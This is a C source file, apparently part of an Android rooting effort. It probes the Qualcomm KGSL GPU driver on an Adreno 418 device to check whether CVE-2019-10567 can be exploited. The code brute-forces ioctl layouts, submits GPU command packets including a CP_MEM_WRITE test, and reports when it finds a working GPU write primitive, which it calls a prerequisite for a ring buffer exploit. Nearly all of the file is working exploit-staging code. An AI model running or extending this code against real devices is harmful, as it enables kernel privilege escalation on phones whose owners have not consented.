/*
 * kgsl_gpu_cmd_probe.c — Probe GPU command submission for CVE-2019-10567
 *
 * Tests whether IOCTL_KGSL_GPU_COMMAND works from shell context.
 * This is the prerequisite for the TiYunZong ring buffer exploit.
 *
 * TEST 1: Create draw context (DRAWCTXT_CREATE)
 * TEST 2: Allocate GPU memory for command buffer
 * TEST 3: Submit GPU command (GPU_COMMAND ioctl)
 * TEST 4: Probe scratch memory accessibility
 * TEST 5: Probe ring buffer RPTR location in scratch
 * TEST 6: Test GPU command writing to scratch page
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o kgsl_gpu_cmd_probe kgsl_gpu_cmd_probe.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

/* KGSL ioctl definitions — BB Priv uses _IOWR for ALL ioctls */
#define KGSL_IOC_TYPE 0x09
#define MAKE_IOCTL_RW(nr, sz) (0xC0000000 | ((sz) << 16) | (KGSL_IOC_TYPE << 8) | (nr))

/* Known working ioctls */
#define CMD_DRAWCTXT_CREATE   MAKE_IOCTL_RW(0x13, 8)
#define CMD_DRAWCTXT_DESTROY  MAKE_IOCTL_RW(0x14, 4)
#define CMD_ALLOC_ID          MAKE_IOCTL_RW(0x34, 48)
#define CMD_FREE_ID           MAKE_IOCTL_RW(0x35, 8)
#define CMD_MMAP              MAKE_IOCTL_RW(0x32, 48)  /* GPUMEM_GET_INFO */

/* GPU_COMMAND — the key ioctl for CVE-2019-10567 */
/* struct kgsl_gpu_command size varies by kernel version, probe multiple sizes */
#define CMD_GPU_COMMAND_BASE  0x39  /* ioctl number for IOCTL_KGSL_GPU_COMMAND */

/* GETPROPERTY for finding scratch info */
#define CMD_GETPROPERTY       MAKE_IOCTL_RW(0x02, 16)

/* DEVICE_GETPROPERTY types */
#define KGSL_PROP_DEVICE_INFO       1
#define KGSL_PROP_DEVICE_SHADOW     2
#define KGSL_PROP_DEVICE_POWER      3
#define KGSL_PROP_SHMEM             4
#define KGSL_PROP_SHMEM_APERTURES   5
#define KGSL_PROP_MMU_ENABLE        6
#define KGSL_PROP_INTERRUPT_WAITS   7
#define KGSL_PROP_VERSION           8
#define KGSL_PROP_GPU_RESET_STAT    9
#define KGSL_PROP_PWRCTRL           10
#define KGSL_PROP_PWR_CONSTRAINT    11
#define KGSL_PROP_UCHE_GMEM_VADDR  12
#define KGSL_PROP_SP_GENERIC_MEM   13
#define KGSL_PROP_GPMU_VERSION     14
#define KGSL_PROP_HIGHEST_BANK_BIT 15
#define KGSL_PROP_MIN_ACCESS_LENGTH 16

/* Draw context flags */
#define KGSL_CONTEXT_NO_GMEM_ALLOC   0x00000001
#define KGSL_CONTEXT_PREAMBLE        0x00000020
#define KGSL_CONTEXT_NO_FAULT_TOLERANCE 0x00000200

/* GPU command types */
#define KGSL_CMD_SYNCPOINT_TYPE_TIMESTAMP 0
#define KGSL_CMD_SYNCPOINT_TYPE_FENCE     1

/* Adreno PM4 (command processor) opcodes */
#define CP_NOP                 0x10
#define CP_MEM_WRITE           0x3D
#define CP_SET_PROTECTED_MODE  0x5F
#define CP_INDIRECT_BUFFER_PFE 0x37
#define CP_TYPE3_PKT(opcode, count) \
    ((3 << 30) | (((count) - 1) << 16) | ((opcode) << 8))

/* GPU memory flags */
#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000
#define KGSL_CACHEMODE_UNCACHED   (1 << 16)
#define KGSL_MEMTYPE_COMMAND      (1 << 8)

/* Structures */
struct kgsl_drawctxt_create {
    unsigned int flags;       /* 0: in */
    unsigned int drawctxt_id; /* 4: out */
};

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id; /* 0: in */
};

struct kgsl_gpumem_alloc_id {
    unsigned int id;          /* 0: out */
    unsigned int flags;       /* 4: in */
    uint64_t size;            /* 8: in */
    uint64_t mmapsize;        /* 16: out */
    uint64_t gpuaddr;         /* 24: out */
    uint64_t __pad;           /* 32 */
    uint64_t __pad2;          /* 40 */
};

struct kgsl_gpumem_free_id {
    unsigned int id;
    unsigned int __pad;
};

struct kgsl_device_getproperty {
    unsigned int type;         /* 0: in — property type */
    void *value;               /* 4/8: out — pointer to receive value */
    unsigned int sizebytes;    /* 8/12: in — size of value buffer */
    unsigned int __pad;
};

/* GPU command submission structure (kernel 3.10 era) */
struct kgsl_command_object {
    uint64_t gpuaddr;    /* GPU address of command buffer */
    uint64_t size;       /* Size of command buffer in bytes */
    unsigned int flags;  /* KGSL_CMDLIST flags */
    unsigned int id;     /* Context specific ID */
};

struct kgsl_command_syncpoint {
    unsigned int type;
    unsigned int size;
    uint64_t __pad;
};

/* The actual GPU_COMMAND ioctl struct — varies by kernel version */
/* Kernel 3.10 msm-3.10 has a specific layout. Try multiple sizes. */
struct kgsl_gpu_command_v1 {
    uint64_t flags;                 /* 0 */
    uint64_t cmdlist;               /* 8: pointer to kgsl_command_object array */
    unsigned int cmdsize;           /* 16: sizeof(kgsl_command_object) */
    unsigned int numcmds;           /* 20: number of commands */
    uint64_t objlist;               /* 24: pointer to kgsl_command_object array */
    unsigned int objsize;           /* 32: sizeof(kgsl_command_object) */
    unsigned int numobjs;           /* 36: number of objects */
    uint64_t synclist;              /* 40: pointer to sync points */
    unsigned int syncsize;          /* 48 */
    unsigned int numsyncs;          /* 52 */
    unsigned int context_id;        /* 56: draw context ID */
    unsigned int timestamp;         /* 60: out — assigned timestamp */
};

/* Smaller variant seen in some kernels */
struct kgsl_gpu_command_v2 {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
    /* Some versions have tickobj, profiling fields after this */
};

struct kgsl_device_info {
    unsigned int device_id;
    unsigned int chip_id;
    unsigned int mmu_enabled;
    unsigned long gmem_gpubaseaddr;
    unsigned int gpu_id;
    unsigned long gmem_sizebytes;
};

struct kgsl_version {
    unsigned int drv_major;
    unsigned int drv_minor;
    unsigned int dev_major;
    unsigned int dev_minor;
};

static sigjmp_buf jmpbuf;
static volatile int got_signal = 0;

static void sighandler(int sig) {
    got_signal = sig;
    siglongjmp(jmpbuf, 1);
}

static int kgsl_fd = -1;

static int open_kgsl(void) {
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("  FAIL: open /dev/kgsl-3d0: %s (errno=%d)\n", strerror(errno), errno);
        return -1;
    }
    printf("  opened /dev/kgsl-3d0 fd=%d\n", kgsl_fd);
    return 0;
}

/* ======================== TEST 1: Device Info & Version ======================== */
static void test1_device_info(void) {
    printf("\n=== TEST 1: Device info and version ===\n");

    struct kgsl_device_info devinfo;
    memset(&devinfo, 0, sizeof(devinfo));
    struct kgsl_device_getproperty prop;
    memset(&prop, 0, sizeof(prop));
    prop.type = KGSL_PROP_DEVICE_INFO;
    prop.value = &devinfo;
    prop.sizebytes = sizeof(devinfo);

    int ret = ioctl(kgsl_fd, CMD_GETPROPERTY, &prop);
    if (ret == 0) {
        printf("  device_id=%u chip_id=0x%x mmu=%u gpu_id=0x%x gmem_size=%lu\n",
               devinfo.device_id, devinfo.chip_id, devinfo.mmu_enabled,
               devinfo.gpu_id, devinfo.gmem_sizebytes);
    } else {
        printf("  GETPROPERTY(DEVICE_INFO) failed: %s\n", strerror(errno));
    }

    struct kgsl_version ver;
    memset(&ver, 0, sizeof(ver));
    prop.type = KGSL_PROP_VERSION;
    prop.value = &ver;
    prop.sizebytes = sizeof(ver);

    ret = ioctl(kgsl_fd, CMD_GETPROPERTY, &prop);
    if (ret == 0) {
        printf("  driver version: %u.%u  device version: %u.%u\n",
               ver.drv_major, ver.drv_minor, ver.dev_major, ver.dev_minor);
    } else {
        printf("  GETPROPERTY(VERSION) failed: %s\n", strerror(errno));
    }

    /* Probe for shadow/shmem info — might reveal scratch page details */
    unsigned char shadow_buf[256];
    memset(shadow_buf, 0, sizeof(shadow_buf));
    prop.type = KGSL_PROP_DEVICE_SHADOW;
    prop.value = shadow_buf;
    prop.sizebytes = sizeof(shadow_buf);

    ret = ioctl(kgsl_fd, CMD_GETPROPERTY, &prop);
    if (ret == 0) {
        printf("  DEVICE_SHADOW available, first 32 bytes: ");
        for (int i = 0; i < 32; i++) printf("%02x", shadow_buf[i]);
        printf("\n");
    } else {
        printf("  DEVICE_SHADOW: %s (errno=%d)\n", strerror(errno), errno);
    }

    /* SHMEM — might give us shared memory with GPU */
    memset(shadow_buf, 0, sizeof(shadow_buf));
    prop.type = KGSL_PROP_SHMEM;
    prop.value = shadow_buf;
    prop.sizebytes = sizeof(shadow_buf);

    ret = ioctl(kgsl_fd, CMD_GETPROPERTY, &prop);
    if (ret == 0) {
        printf("  SHMEM available, first 32 bytes: ");
        for (int i = 0; i < 32; i++) printf("%02x", shadow_buf[i]);
        printf("\n");
    } else {
        printf("  SHMEM: %s (errno=%d)\n", strerror(errno), errno);
    }
}

/* ======================== TEST 2: Draw Context Create ======================== */
static unsigned int test2_drawctxt_create(void) {
    printf("\n=== TEST 2: Draw context creation ===\n");

    /* Try several flag combinations */
    unsigned int ctx_flags[] = {
        0,                                                /* bare minimum */
        KGSL_CONTEXT_NO_GMEM_ALLOC,                       /* skip GMEM */
        KGSL_CONTEXT_PREAMBLE,                             /* with preamble */
        KGSL_CONTEXT_NO_GMEM_ALLOC | KGSL_CONTEXT_PREAMBLE,
        KGSL_CONTEXT_NO_FAULT_TOLERANCE,
        0x00000002, /* try SUBMIT_IB_LIST */
    };
    int nflags = sizeof(ctx_flags) / sizeof(ctx_flags[0]);
    unsigned int best_ctx_id = 0;

    for (int i = 0; i < nflags; i++) {
        struct kgsl_drawctxt_create ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.flags = ctx_flags[i];

        int ret = ioctl(kgsl_fd, CMD_DRAWCTXT_CREATE, &ctx);
        if (ret == 0) {
            printf("  flags=0x%08x -> ctx_id=%u OK\n", ctx_flags[i], ctx.drawctxt_id);
            if (best_ctx_id == 0) best_ctx_id = ctx.drawctxt_id;
        } else {
            printf("  flags=0x%08x -> FAIL: %s (errno=%d)\n", ctx_flags[i], strerror(errno), errno);
        }
    }

    if (best_ctx_id > 0) {
        printf("  SUCCESS — draw context %u created, GPU command path may be viable\n", best_ctx_id);
    } else {
        printf("  FAIL — no draw context could be created\n");
    }
    return best_ctx_id;
}

/* ======================== TEST 3: GPU Memory Alloc + Mmap ======================== */
static int test3_gpu_mem_alloc(uint64_t *out_gpuaddr, unsigned int *out_id, void **out_ptr) {
    printf("\n=== TEST 3: GPU memory allocation for command buffer ===\n");

    struct kgsl_gpumem_alloc_id alloc;
    memset(&alloc, 0, sizeof(alloc));
    alloc.size = 0x1000;  /* 4KB command buffer */
    alloc.flags = KGSL_CACHEMODE_UNCACHED | KGSL_MEMTYPE_COMMAND;

    int ret = ioctl(kgsl_fd, CMD_ALLOC_ID, &alloc);
    if (ret != 0) {
        printf("  ALLOC_ID failed: %s (errno=%d)\n", strerror(errno), errno);
        /* Try without flags */
        memset(&alloc, 0, sizeof(alloc));
        alloc.size = 0x1000;
        alloc.flags = 0x1000008;  /* flags that worked before */
        ret = ioctl(kgsl_fd, CMD_ALLOC_ID, &alloc);
        if (ret != 0) {
            printf("  ALLOC_ID with fallback flags also failed: %s\n", strerror(errno));
            return -1;
        }
    }

    printf("  alloc id=%u size=0x%lx mmapsize=0x%lx gpuaddr=0x%lx\n",
           alloc.id, (unsigned long)alloc.size,
           (unsigned long)alloc.mmapsize, (unsigned long)alloc.gpuaddr);

    /* mmap the GPU memory */
    void *ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                     MAP_SHARED, kgsl_fd, alloc.id * 0x1000);
    if (ptr == MAP_FAILED) {
        printf("  mmap failed: %s (errno=%d)\n", strerror(errno), errno);
        return -1;
    }
    printf("  mmap OK at %p\n", ptr);

    *out_gpuaddr = alloc.gpuaddr;
    *out_id = alloc.id;
    *out_ptr = ptr;
    return 0;
}

/* ======================== TEST 4: GPU_COMMAND ioctl probing ======================== */
static void test4_gpu_command_probe(unsigned int ctx_id, uint64_t cmd_gpuaddr) {
    printf("\n=== TEST 4: GPU_COMMAND ioctl probing ===\n");

    if (ctx_id == 0) {
        printf("  SKIP — no draw context available\n");
        return;
    }

    /* Write a simple NOP command to the GPU memory */
    /* The actual command buffer contents don't matter for the ioctl probe */
    struct kgsl_command_object cmdobj;
    memset(&cmdobj, 0, sizeof(cmdobj));
    cmdobj.gpuaddr = cmd_gpuaddr;
    cmdobj.size = 8;  /* minimum: one PM4 packet (2 dwords) */
    cmdobj.flags = 0; /* KGSL_CMDLIST_IB */

    /* Try multiple struct sizes for GPU_COMMAND ioctl */
    int sizes[] = { 64, 72, 80, 88, 96, 104, 112, 120, 128 };
    int nsizes = sizeof(sizes) / sizeof(sizes[0]);

    for (int i = 0; i < nsizes; i++) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(CMD_GPU_COMMAND_BASE, sizes[i]);
        unsigned char buf[256];
        memset(buf, 0, sizeof(buf));

        /* Fill in what we know of the structure */
        struct kgsl_gpu_command_v1 *cmd = (struct kgsl_gpu_command_v1 *)buf;
        cmd->flags = 0;
        cmd->cmdlist = (uint64_t)(unsigned long)&cmdobj;
        cmd->cmdsize = sizeof(struct kgsl_command_object);
        cmd->numcmds = 1;
        cmd->objlist = 0;
        cmd->objsize = 0;
        cmd->numobjs = 0;
        cmd->synclist = 0;
        cmd->syncsize = 0;
        cmd->numsyncs = 0;
        cmd->context_id = ctx_id;
        cmd->timestamp = 0;

        /* Install signal handler for potential crashes */
        struct sigaction sa, old_sa;
        sa.sa_handler = sighandler;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        sigaction(SIGSEGV, &sa, &old_sa);
        sigaction(SIGBUS, &sa, &old_sa);

        got_signal = 0;
        if (sigsetjmp(jmpbuf, 1) == 0) {
            int ret = ioctl(kgsl_fd, ioctl_nr, buf);
            if (ret == 0) {
                printf("  GPU_COMMAND size=%d -> SUCCESS! timestamp=%u\n",
                       sizes[i], cmd->timestamp);
                printf("  *** GPU COMMAND SUBMISSION WORKS ***\n");
                printf("  *** CVE-2019-10567 exploitation path is VIABLE ***\n");
            } else {
                printf("  GPU_COMMAND size=%d -> errno=%d (%s)\n",
                       sizes[i], errno, strerror(errno));
                /* ENOTTY means wrong ioctl number/size */
                /* EINVAL means right ioctl but bad parameters — this is promising! */
                /* ENOENT means context not found */
                /* EFAULT means bad pointer — also promising, means ioctl handler ran */
                if (errno == EINVAL || errno == EFAULT) {
                    printf("  ^ ioctl handler REACHED — correct ioctl number, size=%d is close\n", sizes[i]);
                }
            }
        } else {
            printf("  GPU_COMMAND size=%d -> SIGNAL %d caught\n", sizes[i], got_signal);
        }

        sigaction(SIGSEGV, &old_sa, NULL);
        sigaction(SIGBUS, &old_sa, NULL);
    }
}

/* ======================== TEST 5: Property probing for scratch info ======================== */
static void test5_scratch_probe(void) {
    printf("\n=== TEST 5: Probing device properties for scratch/ringbuffer info ===\n");

    /* Probe all property types 1-20 */
    for (int type = 1; type <= 20; type++) {
        unsigned char buf[512];
        memset(buf, 0xCC, sizeof(buf));

        struct kgsl_device_getproperty prop;
        memset(&prop, 0, sizeof(prop));
        prop.type = type;
        prop.value = buf;
        prop.sizebytes = sizeof(buf);

        int ret = ioctl(kgsl_fd, CMD_GETPROPERTY, &prop);
        if (ret == 0) {
            /* Count non-0xCC bytes to see actual data size */
            int datalen = 0;
            for (int j = sizeof(buf) - 1; j >= 0; j--) {
                if (buf[j] != 0xCC) { datalen = j + 1; break; }
            }
            printf("  prop %2d: OK, data_size~=%d bytes, first 16: ", type, datalen);
            int show = datalen < 16 ? datalen : 16;
            for (int j = 0; j < show; j++) printf("%02x", buf[j]);
            printf("\n");

            /* For specific known types, decode */
            if (type == KGSL_PROP_VERSION) {
                struct kgsl_version *v = (struct kgsl_version *)buf;
                printf("         version: drv=%u.%u dev=%u.%u\n",
                       v->drv_major, v->drv_minor, v->dev_major, v->dev_minor);
            }
        } else {
            printf("  prop %2d: %s (errno=%d)\n", type, strerror(errno), errno);
        }
    }
}

/* ======================== TEST 6: GPU_COMMAND with NOP packet ======================== */
static void test6_gpu_nop_command(unsigned int ctx_id, uint64_t cmd_gpuaddr, void *cmd_ptr) {
    printf("\n=== TEST 6: GPU NOP command submission ===\n");

    if (ctx_id == 0 || cmd_ptr == NULL) {
        printf("  SKIP — no context or command buffer\n");
        return;
    }

    /* Write a CP_NOP packet into the command buffer */
    /* PM4 Type 3 packet: (3 << 30) | (count-1 << 16) | (opcode << 8) */
    volatile uint32_t *cmdbuf = (volatile uint32_t *)cmd_ptr;
    cmdbuf[0] = CP_TYPE3_PKT(CP_NOP, 1);  /* NOP with 1 dword payload */
    cmdbuf[1] = 0xDEADBEEF;               /* payload (ignored) */

    printf("  wrote NOP command at gpuaddr=0x%lx: 0x%08x 0x%08x\n",
           (unsigned long)cmd_gpuaddr, (uint32_t)cmdbuf[0], (uint32_t)cmdbuf[1]);

    /* Try to submit this NOP command */
    struct kgsl_command_object cmdobj;
    memset(&cmdobj, 0, sizeof(cmdobj));
    cmdobj.gpuaddr = cmd_gpuaddr;
    cmdobj.size = 8;  /* 2 dwords = 8 bytes */
    cmdobj.flags = 0;

    /* Try the most common struct size first (64 bytes) */
    int try_sizes[] = { 64, 72, 80 };
    int ntries = sizeof(try_sizes) / sizeof(try_sizes[0]);

    for (int i = 0; i < ntries; i++) {
        unsigned int ioctl_nr = MAKE_IOCTL_RW(CMD_GPU_COMMAND_BASE, try_sizes[i]);
        unsigned char buf[256];
        memset(buf, 0, sizeof(buf));

        struct kgsl_gpu_command_v1 *cmd = (struct kgsl_gpu_command_v1 *)buf;
        cmd->flags = 0;
        cmd->cmdlist = (uint64_t)(unsigned long)&cmdobj;
        cmd->cmdsize = sizeof(struct kgsl_command_object);
        cmd->numcmds = 1;
        cmd->objlist = 0;
        cmd->objsize = 0;
        cmd->numobjs = 0;
        cmd->synclist = 0;
        cmd->syncsize = 0;
        cmd->numsyncs = 0;
        cmd->context_id = ctx_id;
        cmd->timestamp = 0;

        struct sigaction sa, old_sa;
        sa.sa_handler = sighandler;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        sigaction(SIGSEGV, &sa, &old_sa);
        sigaction(SIGBUS, &sa, &old_sa);

        got_signal = 0;
        if (sigsetjmp(jmpbuf, 1) == 0) {
            int ret = ioctl(kgsl_fd, ioctl_nr, buf);
            if (ret == 0) {
                printf("  NOP command SUBMITTED successfully (size=%d, timestamp=%u)\n",
                       try_sizes[i], cmd->timestamp);
                printf("  *** GPU accepts commands from shell context! ***\n");

                /* Now try a MEM_WRITE command to test GPU write capability */
                printf("  Attempting CP_MEM_WRITE to test GPU write...\n");

                /* Allocate a target buffer for GPU to write to */
                struct kgsl_gpumem_alloc_id target_alloc;
                memset(&target_alloc, 0, sizeof(target_alloc));
                target_alloc.size = 0x1000;
                target_alloc.flags = 0x1000008;

                int r2 = ioctl(kgsl_fd, CMD_ALLOC_ID, &target_alloc);
                if (r2 == 0) {
                    void *target = mmap(NULL, target_alloc.mmapsize,
                                        PROT_READ | PROT_WRITE, MAP_SHARED,
                                        kgsl_fd, target_alloc.id * 0x1000);
                    if (target != MAP_FAILED) {
                        volatile uint32_t *tgt = (volatile uint32_t *)target;
                        tgt[0] = 0;  /* clear target */

                        /* Write CP_MEM_WRITE command */
                        cmdbuf[0] = CP_TYPE3_PKT(CP_MEM_WRITE, 3);
                        /* addr_lo */
                        cmdbuf[1] = (uint32_t)(target_alloc.gpuaddr & 0xFFFFFFFF);
                        /* addr_hi */
                        cmdbuf[2] = (uint32_t)(target_alloc.gpuaddr >> 32);
                        /* data */
                        cmdbuf[3] = 0xCAFEBABE;

                        cmdobj.size = 16;  /* 4 dwords */
                        cmd->timestamp = 0;

                        ret = ioctl(kgsl_fd, ioctl_nr, buf);
                        if (ret == 0) {
                            printf("  MEM_WRITE submitted (timestamp=%u)\n", cmd->timestamp);
                            usleep(50000);  /* wait 50ms for GPU to execute */

                            uint32_t val = tgt[0];
                            if (val == 0xCAFEBABE) {
                                printf("  *** GPU WRITE CONFIRMED: target contains 0x%08x ***\n", val);
                                printf("  *** FULL GPU COMMAND EXECUTION WORKS ***\n");
                                printf("  *** CVE-2019-10567 IS EXPLOITABLE ***\n");
                            } else {
                                printf("  target value: 0x%08x (not 0xCAFEBABE)\n", val);
                                printf("  GPU may not have executed yet, or MEM_WRITE not supported\n");
                            }
                        } else {
                            printf("  MEM_WRITE submit failed: %s\n", strerror(errno));
                        }

                        munmap(target, target_alloc.mmapsize);
                    }
                    struct kgsl_gpumem_free_id fr = { .id = target_alloc.id };
                    ioctl(kgsl_fd, MAKE_IOCTL_RW(0x35, 8), &fr);
                }
                break;
            } else {
                if (errno == EINVAL || errno == EFAULT) {
                    printf("  NOP size=%d: ioctl handler reached (errno=%d), params rejected\n",
                           try_sizes[i], errno);
                } else {
                    printf("  NOP size=%d: %s (errno=%d)\n", try_sizes[i], strerror(errno), errno);
                }
            }
        } else {
            printf("  NOP size=%d: SIGNAL %d\n", try_sizes[i], got_signal);
        }

        sigaction(SIGSEGV, &old_sa, NULL);
        sigaction(SIGBUS, &old_sa, NULL);
    }
}

/* ======================== TEST 7: Timestamp ioctl probing ======================== */
static void test7_timestamp_probe(unsigned int ctx_id) {
    printf("\n=== TEST 7: Timestamp and wait ioctls ===\n");

    /* CMDSTREAM_READTIMESTAMP = 0x11 */
    /* CMDSTREAM_FREEMEMONTIMESTAMP = 0x12 */
    /* DEVICE_WAITTIMESTAMP_CTXTID = 0x32 (maybe) */

    /* Read timestamp — this tells us if the command stream is active */
    struct {
        unsigned int type;         /* KGSL_TIMESTAMP_RETIRED or KGSL_TIMESTAMP_CONSUMED */
        unsigned int timestamp;
    } ts_read;

    /* Type 0 = RETIRED, Type 1 = CONSUMED, Type 2 = QUEUED */
    for (int type = 0; type < 3; type++) {
        memset(&ts_read, 0, sizeof(ts_read));
        ts_read.type = type;

        unsigned int ioctl_nr = MAKE_IOCTL_RW(0x11, sizeof(ts_read));
        int ret = ioctl(kgsl_fd, ioctl_nr, &ts_read);
        if (ret == 0) {
            printf("  READTIMESTAMP type=%d: timestamp=%u\n", type, ts_read.timestamp);
        } else {
            printf("  READTIMESTAMP type=%d: %s (errno=%d)\n", type, strerror(errno), errno);
        }
    }

    /* Try reading timestamp with context ID */
    if (ctx_id > 0) {
        struct {
            unsigned int context_id;
            unsigned int type;
            unsigned int timestamp;
        } ts_ctx;

        for (int type = 0; type < 3; type++) {
            memset(&ts_ctx, 0, sizeof(ts_ctx));
            ts_ctx.context_id = ctx_id;
            ts_ctx.type = type;

            unsigned int ioctl_nr = MAKE_IOCTL_RW(0x16, sizeof(ts_ctx));
            int ret = ioctl(kgsl_fd, ioctl_nr, &ts_ctx);
            if (ret == 0) {
                printf("  READTIMESTAMP_CTXTID ctx=%u type=%d: timestamp=%u\n",
                       ctx_id, type, ts_ctx.timestamp);
            } else {
                printf("  READTIMESTAMP_CTXTID ctx=%u type=%d: %s (errno=%d)\n",
                       ctx_id, type, strerror(errno), errno);
            }
        }
    }
}

/* ======================== MAIN ======================== */
int main(void) {
    printf("=== kgsl_gpu_cmd_probe — CVE-2019-10567 feasibility test ===\n");
    printf("Target: /dev/kgsl-3d0 (Adreno 418, Snapdragon 808)\n");
    printf("Goal: Determine if GPU command submission works from shell context\n\n");

    if (open_kgsl() < 0) return 1;

    /* TEST 1: Device info */
    test1_device_info();

    /* TEST 2: Draw context creation */
    unsigned int ctx_id = test2_drawctxt_create();

    /* TEST 3: Allocate GPU command buffer */
    uint64_t cmd_gpuaddr = 0;
    unsigned int cmd_id = 0;
    void *cmd_ptr = NULL;
    int mem_ok = test3_gpu_mem_alloc(&cmd_gpuaddr, &cmd_id, &cmd_ptr);

    /* TEST 4: Probe GPU_COMMAND ioctl with various struct sizes */
    if (mem_ok == 0) {
        test4_gpu_command_probe(ctx_id, cmd_gpuaddr);
    } else {
        printf("\n=== TEST 4: SKIP — no GPU memory ===\n");
    }

    /* TEST 5: Property probing for scratch/ringbuffer info */
    test5_scratch_probe();

    /* TEST 6: Actual GPU NOP command submission */
    if (mem_ok == 0 && ctx_id > 0) {
        test6_gpu_nop_command(ctx_id, cmd_gpuaddr, cmd_ptr);
    } else {
        printf("\n=== TEST 6: SKIP — no context or memory ===\n");
    }

    /* TEST 7: Timestamp probing */
    test7_timestamp_probe(ctx_id);

    /* Cleanup */
    if (cmd_ptr && cmd_ptr != MAP_FAILED) {
        struct kgsl_gpumem_alloc_id dummy;
        /* Use the alloc_size (not mmapsize) but we don't track it separately */
        /* Just unmap what we can */
        munmap(cmd_ptr, 0x2000);  /* alloc 0x1000 + guard page */
    }
    if (cmd_id > 0) {
        struct kgsl_gpumem_free_id fr = { .id = cmd_id };
        ioctl(kgsl_fd, MAKE_IOCTL_RW(0x35, 8), &fr);
    }
    if (ctx_id > 0) {
        struct kgsl_drawctxt_destroy ctx_d = { .drawctxt_id = ctx_id };
        ioctl(kgsl_fd, CMD_DRAWCTXT_DESTROY, &ctx_d);
    }
    close(kgsl_fd);

    printf("\n=== SUMMARY ===\n");
    printf("If GPU_COMMAND succeeded -> CVE-2019-10567 path is open\n");
    printf("If GPU_COMMAND failed with EINVAL/EFAULT -> correct ioctl, wrong params (fixable)\n");
    printf("If GPU_COMMAND failed with ENOTTY -> wrong ioctl size (try more sizes)\n");
    printf("If draw context failed -> SELinux or capability restriction (hard block)\n");

    return 0;
}
